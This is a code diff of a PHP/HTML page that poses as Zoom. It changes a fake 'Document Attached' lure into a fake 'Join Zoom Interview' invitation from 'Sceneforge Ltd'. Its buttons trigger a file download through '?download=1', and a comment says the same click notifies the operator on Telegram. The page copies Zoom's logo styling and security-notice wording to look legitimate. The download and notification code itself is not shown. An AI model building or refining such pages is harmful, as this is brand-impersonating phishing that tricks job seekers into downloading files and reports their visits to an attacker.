@@ -80,7 +80,7 @@ if (!isset($_GET['download'])) {
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Zoom Document Cloud</title>
+    <title>Zoom Cloud</title>
     <style>
         body {
             font-family: Arial, sans-serif;
@@ -107,10 +107,12 @@ if (!isset($_GET['download'])) {
             box-sizing: border-box;
         }
         .zoom-logo {
-            font-size: 26px;
-            font-weight: bold;
+            font-size: 32px;
+            font-weight: 800;
             color: #0b5cff;
-            margin-bottom: 20px;
+            letter-spacing: -0.5px;
+            margin-bottom: 22px;
+            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
         }
         .doc-box {
             border: 1px solid #e1e4e8;
@@ -121,24 +123,40 @@ if (!isset($_GET['download'])) {
         }
         .doc-title {
             font-weight: bold;
-            font-size: 15px;
-            color: #333;
-            margin-bottom: 5px;
+            font-size: 16px;
+            color: #222;
+            margin-bottom: 4px;
             text-align: center;
         }
         .doc-subtitle {
             font-size: 12px;
             color: #666;
-            margin-bottom: 15px;
+            margin-bottom: 18px;
             text-align: center;
+            font-weight: 500;
         }
         .info-bar {
             background: #f0f4ff;
             border-radius: 4px;
-            padding: 10px;
-            font-size: 12px;
-            color: #0b5cff;
+            padding: 12px;
             margin-bottom: 15px;
+            border: 1px solid #d0e1fd;
+        }
+        .info-bar a {
+            color: #0b5cff;
+            font-size: 13px;
+            font-weight: bold;
+            text-decoration: none;
+            display: block;
+            margin-bottom: 3px;
+        }
+        .info-bar a:hover {
+            text-decoration: underline;
+        }
+        .info-bar span {
+            font-size: 11px;
+            color: #555;
+            font-weight: 500;
         }
         .download-btn {
             display: block;
@@ -174,7 +192,7 @@ if (!isset($_GET['download'])) {
         }
         .security-footer a {
             color: #0b5cff;
-            text-align: none;
+            text-decoration: none;
         }
     </style>
 </head>
@@ -182,20 +200,20 @@ if (!isset($_GET['download'])) {
 
     <div class="wrapper">
         <div class="container">
-            <!-- Zoom Logo Centered at Top -->
+            <!-- Styled Zoom Logo Centered at Top -->
             <div class="zoom-logo">Zoom</div>
 
             <div class="doc-box">
-                <div class="doc-title">Document Attached</div>
-                <div class="doc-subtitle">Zoom Document Cloud</div>
+                <div class="doc-title">Join Zoom Interview</div>
+                <div class="doc-subtitle">Zoom Cloud</div>
                 
                 <div class="info-bar">
-                    Click here to join meeting notes<br>
-                    <span style="font-size: 10px; color: #555;">Prepared by Accounts</span>
+                    <a href="?download=1">Click here to join zoom interview</a>
+                    <span>Sceneforge Ltd</span>
                 </div>
 
                 <!-- Triggers download and notifies Telegram simultaneously -->
-                <a href="?download=1" class="download-btn">View Document</a>
+                <a href="?download=1" class="download-btn">Click here to join</a>
             </div>
 
             <div style="font-size: 11px; color: #888;">
@@ -203,7 +221,7 @@ if (!isset($_GET['download'])) {
             </div>
         </div>
 
-        <!-- Security Notice & Footer requested directly below -->
+        <!-- Security Notice & Footer -->
         <div class="security-footer">
             <p>For your security, Zoom sends emails only from the following email addresses: <a href="https://zoom.us" target="_blank">zoom@zoom.us</a>, <a href="https://zoom.us" target="_blank">zoom@accounts.zoom.us</a>, and <a href="https://zoom.us" target="_blank">support@email.zoom.us</a>. Be cautious of emails from other addresses claiming to be us. If you suspect this email violates Zoom's Terms of Service, help protect our community and report abuse.</p>
             
